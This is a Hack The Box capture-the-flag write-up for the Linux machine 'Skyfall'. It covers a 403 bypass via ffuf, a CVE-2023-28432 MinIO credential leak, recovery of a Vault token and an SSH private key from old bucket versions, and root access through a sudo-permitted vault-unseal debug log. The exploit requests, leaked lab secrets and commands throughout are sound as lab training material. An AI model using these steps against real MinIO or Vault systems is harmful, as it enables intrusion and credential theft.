---
name: Skyfall
difficulty: Insane
os: Linux
thumbnail: https://labs.hackthebox.com/storage/avatars/e43c6cdfe71e56188e5c2c4f39f5c180.png
active: true
---

# Enumeration

Start with a basic nmap scan:

```bash
Nmap scan report for skyfall.htb (10.129.230.158)
Host is up, received syn-ack (0.043s latency).
Scanned at 2024-05-20 02:03:22 EDT for 9s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCVqvI8vGs8EIUAAUiRze8kfKmYh9ETTUei3zRd1wWWLRBjSm+soBLfclIUP69cNtQOa961nyt2/BOwuR35cLR4=
|   256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINk0VgEkDNZoIJwcG5LEVZDZkEeSRHLBmAOtd/pduzRW
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Upon going to [http://skyfall.htb/](http://skyfall.htb/) you'll find a link to try out the demo: [http://demo.skyfall.htb/](http://demo.skyfall.htb/)

#

It's a cloud file storage dashboard, theres a couple of things to interact with but we see this on the dashboard:

![](/images/htb/skyfall/dashboardHint.png)

We can see that one of the tasks is assessing "Minio" storage security, MinIO is a storage bucket solution. Along with this theres also a "MinIO Metrics" page we can nav to.
The page returns a 403, thought this was weird. After attempting common vulnerabilities on the main inputs, I went and researched into bypassing this 403.

#

After trying basic samples, we can move onto ffuf to fuzz common bypasses. After trying some wordlists, we can make a wordlist of out `/seclists/fuzzing/403/403.md`

```sh
$ ffuf -u http://demo.skyfall.htb/metricsFUZZ -request req -w /usr/share/wordlists/seclists/Fuzzing/403/403.txt

%0a                     [Status: 200, Size: 44864, Words: 4191, Lines: 9, Duration: 98ms]
:: Progress: [74/74] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

# MinIO

So now we can visit http://demo.skyfall.htb/metrics%0a, it lists off configuration details and some other MinIO nodes available.
Most noteably a version number (`2023-03-13T19:46:17z`) and an api url: [http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster](http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster)
![](/images/htb/skyfall/minioMetrics.png)

#

With my original testing I visited the "URL Fetch" page, I wasn't able to get it to fetch any local files however we can use this input to interact with the MinIO nodes.. but there's no data leakage.

#

After reading the docs and looking online, we can find a `CVE-2023-28432` POC, if you post to `/minio/bootstrap/v1/verify` with empty data it'll respond with some credentials.

- `MINIO_ROOT_USER`: 5GrE1B2YGGyZzNHZaIww
- `MINIO_ROOT_PASSWORD`: GkpjkmiVmpFuL2d3oRx0

```sh
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: prd23-s3-backend.skyfall.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
```

```javascript
{
  "MinioEnv": {
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_BROWSER": "off",
    "MINIO_CONFIG_ENV_FILE": "config.env",
    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
    "MINIO_ROOT_USER_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    "MINIO_UPDATE": "off",
    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
  }
}
```

Now install `mc` binary from MinIO

```bash
wget https://dl.min.io/client/mc/release/linux-amd64/mc
chmod +x mc
sudo mv mc /usr/local/bin/
```

Add an alias with the credentials

```bash
mc alias set skyfall http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
```

And now we can dig around, `askyy` is the only user with extra files.

```bash
$ mc ls skyfall
[2023-11-07 23:59:15 EST]     0B askyy/
[2023-11-07 23:58:56 EST]     0B btanner/
[2023-11-07 23:58:33 EST]     0B emoneypenny/
[2023-11-07 23:58:22 EST]     0B gmallory/
[2023-11-07 19:08:01 EST]     0B guest/
[2023-11-07 23:59:05 EST]     0B jbond/
[2023-11-07 23:58:10 EST]     0B omansfield/
[2023-11-07 23:58:45 EST]     0B rsilva/

$ mc ls skyfall/askyy
[2023-11-08 00:35:28 EST]  48KiB STANDARD Welcome.pdf
[2023-11-09 16:37:25 EST] 2.5KiB STANDARD home_backup.tar.gz

$ mc cp skyfall/askyy/home_backup.tar.gz ~/htb/skyfall/home_backup.tar.gz
```

This backup stands out of course, but theres no important data it seems..

After research we find something promising called `evil_minio`, a patched mc binary which can be updated through mc using an external link. Giving us a backdoor.

This sadly might of been a rabbit hole.

Going back we can instead check to see if theres more versions of home_backup that askyy might of saved, there is.

```sh
$ mc ls --versions skyfall/askyy
[2023-11-08 00:35:28 EST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT Welcome.pdf
[2023-11-09 16:37:25 EST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
[2023-11-09 16:37:09 EST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
[2023-11-09 16:36:30 EST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz

$ mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz ~/htb/skyfall/askyy/home_backupV2.tar.gz
$ mc cp --version-id 3c498578-8dfe-43b7-b679-32a3fe42018f skyfall/askyy/home_backup.tar.gz ~/htb/skyfall/askyy/home_backupV1.tar.gz
```

In v2 inside of `.bashrc` we find this:

```sh
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```

And in v1 we find an ssh key for `askyy@skyfall.htb`.

```sh
-----BEGIN OPENSSH PRIVATE KEY-----
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
r5CqjUuqs9QHv+GGNl/r2ydAdCY=
-----END OPENSSH PRIVATE KEY-----
```

# Vault

We need the `vault` binary from hashicorp.

Export variables:

```sh
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
```

After poking around and reading the docs, we learn of a way to ssh into the machine.
You're able to ssh using a OTP, but you also need to provide a role. We can find the roles like so:

```sh
$ vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
```

Finally we can ssh in:

```sh
$ vault ssh -mode=otp -role=dev_otp_key_role askyy@skyfall.htb
askyy@skyfall:~$
```

# Root

If we run `sudo -l` we get:

```sh
$ sudo -l
User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```

If we run with `-dv` (debug, verbose)

```sh
$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -dv
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```

it'll create `/home/askyy/debug.log` which we don't have permission to read. We can then just create our own debug.log and chown it.

```bash
$ touch debug.log
$ chown askyy:askyy debug.log
$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -dv
$ cat debug.log
2024/02/07 17:48:21 Initializing logger...
2024/02/07 17:48:21 Reading: /etc/vault-unseal.yaml
2024/02/07 17:48:21 Security Risk!
2024/02/07 17:48:21 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/02/07 17:48:21 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/02/07 17:48:21 Check interval: 5s
2024/02/07 17:48:21 Max checks: 5
2024/02/07 17:48:21 Establishing connection to Vault...
2024/02/07 17:48:21 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/02/07 17:48:21 Checking seal status
2024/02/07 17:48:21 Vault sealed: false
```

Now we have a new vault token. We can update our namespace and the token:

```sh
export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
```

Finally ssh into root using the other vault role:

```sh
$ vault ssh -role admin_otp_key_role -mode otp root@skyfall.htb
root@skyfall:~$
```
